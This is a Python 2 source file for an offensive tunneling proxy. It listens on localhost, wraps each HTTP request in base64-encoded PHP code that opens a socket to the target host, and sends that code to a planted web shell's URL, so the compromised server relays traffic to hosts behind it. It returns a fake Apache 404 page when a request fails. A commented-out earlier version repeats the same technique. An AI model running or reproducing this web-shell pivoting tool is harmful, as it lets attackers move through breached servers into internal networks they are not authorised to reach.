import socket
from urlparse import urlparse
from base64 import encodestring
import request
import os
from multiprocessing import Process
import asyncore


nf_404 = """HTTP/1.1 404 Not Found
Date: Tue, 16 Feb 2016 12:33:50 GMT
Server: Apache/2.2.15 (CentOS)
Content-Length: 330
Connection: close
Content-Type: text/html; charset=iso-8859-1

No response from server
"""


class ReqHandler(asyncore.dispatcher_with_send):

    def __init__(self, sock, sh_url):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.sh_url = sh_url

    def handle_read(self):
        try:
            data = self.recv(8192)
            if data:
                response = self.forward_request(data)
                if response:
                    self.send(response)
                else:
                    self.send(nf_404)
        except:
            pass

    def forward_request(self, data):
        if data:
            lines = data.split("\r\n")
            l1 = lines[0]
            (method, url, version) = l1.split()
            parsed_url = urlparse(url)
            if parsed_url.hostname:
                if parsed_url.query:
                    path_query = "{0}?{1}".format(parsed_url.path,
                                                  parsed_url.query)
                else:
                    path_query = parsed_url.path
                rb_request = "{0} {1} {2}\r\n".format(method,
                                                      path_query,
                                                      version)
                headers_str = "\r\n".join(lines[1:])
                #Works better closing http connection
                headers_str = headers_str.replace("Connection: keep-alive",
                                                  "Connection: close")
                b64_request = encodestring("{0}{1}".format(rb_request,
                                                           headers_str))
                port = parsed_url.port if parsed_url.port else 80
                #PHP code to run in the server
                php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
                              fwrite($fp, base64_decode('{2}'));
                              while (!feof($fp)) {{ echo fgets($fp, 2048); }};
                              fclose($fp);"""
                php_code = php_code.format(parsed_url.hostname,
                                           port,
                                           b64_request.replace(os.linesep, ""))
                b64_php_code = "param={0}".format(encodestring(php_code))
                b64_php_code = b64_php_code.replace(os.linesep, "")
                response = request.do_request(self.sh_url,
                                              b64_php_code,
                                              None)
                if response:
                    return response
        return None


class ReqServer(asyncore.dispatcher):

    def __init__(self, host, port, sh_url):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(10)
        self.sh_url = sh_url

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            handler = ReqHandler(sock, self.sh_url)


class Proxy(Process):
    host = 'localhost'
    port = 8888

    def set_shell_url(self, sh_url):
        self.sh_url = sh_url

    def run(self):
        #print "Starting proxy on port {0}".format(self.port)
        server = ReqServer(self.host, self.port, self.sh_url)
        asyncore.loop()


# class Proxy(Process):
#     host = 'localhost'
#     port = 8888

#     def set_shell_url(self, sh_url):
#         self.shell_url = sh_url

#     def forward_request(self, sh_url, conn):
#         #conn.setblocking(0)
#         data = conn.recv(2400000)
#         #try:
#         #    buff = conn.recv(240000)
#             #while buff:
#         #    data += buff
#             #    buff = conn.recv(24000)
#             #    print "here"
#         #except:
#         #    pass
#         if data:
#             lines = data.split("\r\n")
#             l1 = lines[0]
#             (method, url, version) = l1.split()
#             parsed_url = urlparse(url)
#             if parsed_url.hostname:
#                 if parsed_url.query:
#                     path_query = "{0}?{1}".format(parsed_url.path, parsed_url.query)
#                 else:
#                     path_query = parsed_url.path
#                 rb_request = "{0} {1} {2}\r\n".format(method, path_query, version)
#                 headers_str = '\r\n'.join(lines[1:])
#                 b64_request = encodestring("{0}{1}".format(rb_request, headers_str))
#                 port = parsed_url.port if parsed_url.port else 80
#                 php_code = """$fp = fsockopen('{0}', {1}, $errno, $errstr, 5);
#                               fwrite($fp, base64_decode('{2}'));
#                               while (!feof($fp)) {{ echo fgets($fp, 128); }};
#                               fclose($fp);""".format(parsed_url.hostname, port, b64_request.replace(os.linesep, ""))
#                 b64_php_code = "param={0}".format(encodestring(php_code))

#                 response = request.do_request(sh_url, b64_php_code.replace(os.linesep, ""), None)
#                 if response:
#                     conn.send(response)
#         conn.close()

#     def run(self):
#         print "Starting proxy on port {0}".format(self.port)
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         s.bind((self.host, self.port))
#         s.listen(10)
#         self.run_flag = True
#         while self.run_flag:
#             conn, addr = s.accept()
#             start_new_thread(self.forward_request, (self.shell_url, conn))

#     def stop(self):
#         self.run_flag = False
